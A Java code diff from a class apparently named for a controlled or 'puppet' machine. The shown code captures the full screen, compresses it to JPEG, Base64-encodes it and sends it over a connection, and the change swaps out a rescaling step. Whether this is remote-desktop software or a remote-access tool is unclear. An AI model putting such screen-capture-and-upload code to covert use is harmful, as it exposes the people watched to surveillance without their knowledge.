@@ -106,21 +106,21 @@ public class 傀儡机 {
                 Dimension screenSize = Toolkit.getDefaultToolkit().getScreenSize();
                 BufferedImage image = new Robot().createScreenCapture(new Rectangle(screenSize));
 
-
-                Graphics g = image.getGraphics();
-                Image scaledImage = image.getScaledInstance(1200, 800, Image.SCALE_SMOOTH);
-                BufferedImage ret = new BufferedImage(1200, 800, BufferedImage.TYPE_INT_RGB);
-                g = ret.getGraphics();
-                g.drawImage(scaledImage, 0, 0, null);
-
-
-                BufferedImage bufferedImage = new BufferedImage(scaledImage.getWidth(null), scaledImage.getHeight(null), BufferedImage.TYPE_INT_RGB);
-                Graphics2D graphics = bufferedImage.createGraphics();
-                //重构图片 
-                graphics.drawImage(scaledImage, 0, 0, scaledImage.getWidth(null), scaledImage.getHeight(null), null);
+//
+//                Graphics g = image.getGraphics();
+//                Image scaledImage = image.getScaledInstance(1200, 800, Image.SCALE_SMOOTH);
+//                BufferedImage ret = new BufferedImage(1200, 800, BufferedImage.TYPE_INT_RGB);
+//                g = ret.getGraphics();
+//                g.drawImage(scaledImage, 0, 0, null);
+//
+//
+//                BufferedImage bufferedImage = new BufferedImage(scaledImage.getWidth(null), scaledImage.getHeight(null), BufferedImage.TYPE_INT_RGB);
+//                Graphics2D graphics = bufferedImage.createGraphics();
+//                //重构图片 
+//                graphics.drawImage(scaledImage, 0, 0, scaledImage.getWidth(null), scaledImage.getHeight(null), null);
                 ByteArrayOutputStream out = new ByteArrayOutputStream();
 
-                Thumbnails.of(bufferedImage).scale(1).outputQuality(0.25f).outputFormat("jpg").toOutputStream(out);
+                Thumbnails.of(image).scale(1).outputQuality(0.25f).outputFormat("jpg").toOutputStream(out);
                 out.flush();
                 message.setContent(Base64.encodeBase64String(out.toByteArray()));
                 conn.setSync(false);//设置异步请求
